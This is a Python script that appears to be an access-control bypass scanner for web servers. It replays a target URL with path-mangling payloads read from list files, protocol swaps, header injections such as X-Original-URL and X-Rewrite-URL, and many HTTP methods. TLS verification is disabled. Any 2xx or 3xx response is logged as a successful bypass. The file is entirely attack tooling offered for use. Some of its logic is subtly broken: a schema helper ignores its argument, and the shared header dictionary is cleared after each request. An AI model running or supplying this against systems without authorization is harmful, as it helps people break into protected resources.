from optparse import OptionParser
import requests
import re
import json
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


parser = OptionParser()

parser.add_option("-u", "--url", dest="url",
    help="Enter your target url", default='-')

parser.add_option("-p", "--pathbased", dest="pathbased",
    help="Want to check Path-Based payloads? (y/n): ", default='n')

parser.add_option("-o", "--output", dest="output",
    help="Your output filename.", default='-')

parser.add_option("-c", "--customattack", dest="customattack",
    help="Want to check Custom-Created payloads? (y/n): ", default='n')

(options, args) = parser.parse_args()

output_file = ""
if options.output != "-":
    output_file = options.output
    output_file_handle = open(output_file, "a+", encoding="utf-8", errors="ignore")

domain = options.url
domain = domain if domain[-1] != "/" else domain[:-1]

default_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
}

sample_data = {"name":"Nochi"}

def ExtractDomainPath(domain):
    regex = r"^(?:https?:\/\/)?(?:[^@\n]+@)?(?:www\.)?(?:[^:\/\n?]+)"
    raw_domain = re.findall(regex, domain)[0]
    url = re.sub(raw_domain, "", domain)
    return raw_domain, url

def ExtractSchema(domin):
    regex = r"(?:)http[s]?"
    result = re.findall(regex, domain)
    return str(result[0])

def PathBasedAttacks(fulldomain):


    def construct_payload(fulldomain, pattern):

        raw_domain, raw_path = ExtractDomainPath(fulldomain)
        try:
            raw_path = raw_path if "/" not in raw_path[0] else raw_path[1:]
        except:
            raw_path = raw_path
        try:
            raw_path = raw_path if "/" not in raw_path[-1] else raw_path[:-1]
        except:
            raw_path = raw_path
        # Full Domain: https://example.tld/secret
        # Raw Domain: https://example.tld
        # Raw Path: secret
        # pattern: before~/%2e/|after~//
        patterns = pattern.split("|")
        before_payload = ""
        after_payload = ""
        if "before" not in pattern:
            before_payload = "/"

        for pattern in patterns:
            position, payload = pattern.split("~")
            if position == "before":
                before_payload = payload
            elif position == "after":
                after_payload = payload
        final_payload = f"{raw_domain}{before_payload}{raw_path}{after_payload}"
        return final_payload

    schema = ExtractSchema(fulldomain)
    path_payloads = []
    payloads = open("pathBasedBypassList.txt", "r", encoding="utf-8", errors="ignore").readlines()
    for line in payloads:
        line = line.replace("\n", "")
        line = line.replace("{{schema}}", schema)
        line = json.loads(line)
        path_payloads.append(line)
    sample_data = {"name": "nochi"}




    for path_attack in path_payloads:

        custom_headers = default_headers
        if "header" in path_attack.keys():
            for headers in path_attack["header"].split("~"):
                header_key, header_value = headers.split(":")
                custom_headers[header_key] = header_value

        if "rev:" in path_attack["protocol"]:
            if "https://" in fulldomain:
                fulldomain = fulldomain.replace("https://", "http://")
            elif "http://" in fulldomain:
                fulldomain = fulldomain.replace("http://", "https://")

        if path_attack["http_method"].lower() == "get":
            request = construct_payload(fulldomain, path_attack["pattern"])
            bypass_request = requests.get(request, headers=custom_headers, verify=False,
                                          allow_redirects=True)

        elif path_attack["http_method"].lower() == "post":
            request = construct_payload(fulldomain, path_attack["pattern"])
            bypass_request = requests.post(request, data=sample_data, headers=custom_headers, verify=False,
                                          allow_redirects=True)

        else:
            print("No Valid HTTP Method Found!")
            continue

        if str(bypass_request.status_code)[0] == "2" or str(bypass_request.status_code)[0] == "3":
            HTTP_Method = path_attack['http_method']
            Request_Path = request
            StatusCode = str(bypass_request.status_code)
            ContentLength = str(len(bypass_request.content))
            Used_Headers = ""
            for key, value in custom_headers.items():
                Used_Headers += f"{key}: {value}\n"
            output = f"HTTP Method '{HTTP_Method}'\nPath: {Request_Path}\nStatusCode: {StatusCode}\nContent Length: {ContentLength}\nHeaders:\n{Used_Headers}\n--------------------\n"
            print(output)
            if output_file:
                output_file_handle.write(output)

        custom_headers.clear()


def ReturnResult(request_object, httpmethod, path, headers, message):
    StatusCode = str(request_object.status_code)
    ContentLength = str(len(request_object.content))
    Used_Headers = ""
    for key, value in headers.items():
        Used_Headers += f"{key}: {value}\n"
    if str(request_object.status_code)[0] == "2" or str(request_object.status_code)[0] == "3":
        output = f"HTTP Method '{httpmethod}'\nPath: {path}\nStatusCode: {StatusCode}\nContent Length: {ContentLength}\n{message}\nHeaders:\n{Used_Headers}\n--------------------\n"
        print(output)
        if output_file:
            output_file_handle.write(output)




schema = ExtractSchema(domain)



def CustomAttacks(fulldomain):

    raw_domain, raw_path = ExtractDomainPath(fulldomain)
    # Full Domain: https://example.tld/secret?index=0
    # Raw Domain: https://example.tld
    # Raw Path: secret?index=0

    # ======= X-Original-URL Bypass =======
    try:
        custom_headers = default_headers
        try:
            raw_path = raw_path if "/" not in raw_path[0] else raw_path[1:]
            raw_path = raw_path if "/" not in raw_path[-1] else raw_path[:-1]
        except:
            raw_path = raw_path
        custom_headers["X-Original-URL"] = raw_path
        bypass_request = requests.get(raw_domain, headers=custom_headers, verify=False,
                                      allow_redirects=True)
        ReturnResult(bypass_request, "GET", raw_path, custom_headers, "X-Original-URL Bypass")
        custom_headers.clear()
    except Exception as e:
        print(f"Error on testing X-Original-URL: {e}")


    # ======= X-Rewrite-URL Bypass =======
    try:
        custom_headers = default_headers
        try:
            raw_path = raw_path if "/" not in raw_path[0] else raw_path[1:]
            raw_path = raw_path if "/" not in raw_path[-1] else raw_path[:-1]
        except:
            raw_path = raw_path
        custom_headers["X-Rewrite-URL"] = raw_path
        bypass_request = requests.get(raw_domain, headers=custom_headers, verify=False,
                                      allow_redirects=True)
        ReturnResult(bypass_request, "GET", raw_path, custom_headers, "X-Rewrite-URL")
        custom_headers.clear()
    except Exception as e:
        print(f"Error on testing X-Rewrite-URL: {e}")

def ReturnURL(domain, url, protocol):
    if protocol == "https" and "https://" not in domain:
        domain = domain.replace("http://", "https://")
        final_url = f"{domain}{url}"
    elif protocol == "http" and "http://" not in domain:
        domain = domain.replace("https://", "http://")
        final_url = f"{domain}{url}"
    else:
        final_url = f"{domain}{url}"

    if "rev:" in protocol:
        org_schema = protocol.replace("rev:", "")
        if org_schema == "https":
            domain = domain.replace("https://", "http://")
            final_url = f"{domain}{url}"
        elif org_schema == "http":
            domain = domain.replace("http://", "https://")
            final_url = f"{domain}{url}"
        else:
            final_url = f"{domain}{url}"

    return final_url

bypass_list = []
b_file = open("bypassList.txt", "r", encoding="utf-8", errors="ignore").readlines()
for line in b_file:
    line = line.replace("\n", "")
    line = line.replace("{{schema}}", schema)
    bypass_list.append(line)

for request_option in bypass_list:
    request_option = json.loads(request_option)


    custom_headers = default_headers
    if "header" in request_option.keys():
        for headers in request_option["header"].split("~"):
            header_key, header_value = headers.split(":")
            custom_headers[header_key] = header_value


    if request_option["http_method"] == "GET":
        request = ReturnURL(domain, request_option['path'], request_option['protocol'])
        bypass_request = requests.get(request, headers=custom_headers, verify=False,
                                        allow_redirects=True)

    elif request_option["http_method"] == "POST":
        request = ReturnURL(domain, request_option['path'], request_option['protocol'])
        bypass_request = requests.post(request, data=sample_data, headers=custom_headers, verify=False,
                                        allow_redirects=True)

    elif request_option["http_method"] == "PUT":
        request = ReturnURL(domain, request_option['path'], request_option['protocol'])
        bypass_request = requests.put(request, data=sample_data, headers=custom_headers, verify=False,
                                        allow_redirects=True)

    elif request_option["http_method"] == "DELETE":
        request = ReturnURL(domain, request_option['path'], request_option['protocol'])
        bypass_request = requests.delete(request, headers=custom_headers, verify=False,
                                        allow_redirects=True)

    elif request_option["http_method"] == "HEAD":
        request = ReturnURL(domain, request_option['path'], request_option['protocol'])
        bypass_request = requests.head(request, headers=custom_headers, verify=False,
                                        allow_redirects=True)

    elif request_option["http_method"] == "OPTIONS":
        request = ReturnURL(domain, request_option['path'], request_option['protocol'])
        bypass_request = requests.options(request, headers=custom_headers, verify=False,
                                        allow_redirects=True)

    elif request_option["http_method"] == "PATCH":
        request = ReturnURL(domain, request_option['path'], request_option['protocol'])
        bypass_request = requests.patch(request, data=sample_data, headers=custom_headers, verify=False,
                                        allow_redirects=True)
    else:
        print("Not Valid HTTP Method Passed To Rules.")
        continue

    if str(bypass_request.status_code)[0] == "2" or str(bypass_request.status_code)[0] == "3":
        HTTP_Method = request_option['http_method']
        Request_Path = request
        StatusCode = str(bypass_request.status_code)
        ContentLength = str(len(bypass_request.content))
        Used_Headers = ""
        for key, value in custom_headers.items():
            Used_Headers += f"{key}: {value}\n"
        output = f"HTTP Method '{HTTP_Method}'\nPath: {Request_Path}\nStatusCode: {StatusCode}\nContent Length: {ContentLength}\nHeaders:\n{Used_Headers}\n--------------------\n"
        print(output)
        if output_file:
            output_file_handle.write(output)


    custom_headers.clear()

if "y" in options.customattack.lower():
    CustomAttacks(domain)

if "y" in options.pathbased.lower():
    PathBasedAttacks(domain)

if output_file:
    output_file_handle.close()